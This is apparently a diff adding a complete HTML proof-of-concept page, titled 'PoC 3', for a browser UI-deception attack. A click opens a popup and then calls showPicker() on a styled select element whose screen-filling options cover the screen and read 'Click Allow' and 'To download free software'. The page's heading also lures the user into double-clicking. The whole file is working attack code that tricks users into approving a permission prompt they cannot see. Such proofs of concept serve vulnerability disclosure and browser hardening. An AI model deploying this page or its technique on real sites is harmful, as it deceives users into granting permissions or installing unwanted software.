@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC 3</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        select {
+            all: initial;
+            text-align: center;
+            width: 18.75vw;
+            font-size: 1.5rem;
+            margin-top: 90px;
+            margin-left: 47px;
+            background-color: rgb(19, 19, 19);
+        }
+
+        option {
+            height: 100vh;
+        }
+    </style>
+</head>
+
+<body>
+    <center>
+        <h1>Double-Click here to continue</h1>
+    </center>
+    <select id="mySelect">
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled></option>
+        <option disabled>Click Allow</option>
+        <option disabled>To download free software</option>
+        <option disabled></option>
+        <option disabled></option>
+
+
+    </select>
+    <script>
+
+        var selectElement = document.getElementById("mySelect");
+
+
+        document.addEventListener('click', function (event) {
+            window.open('permission.html', 'popupWindow', 'width=500,height=500,left=50,top=250');
+
+            setTimeout(() => {
+                selectElement.showPicker();
+            }, 500);
+
+        });
+
+
+    </script>
+</body>
+
+</html>
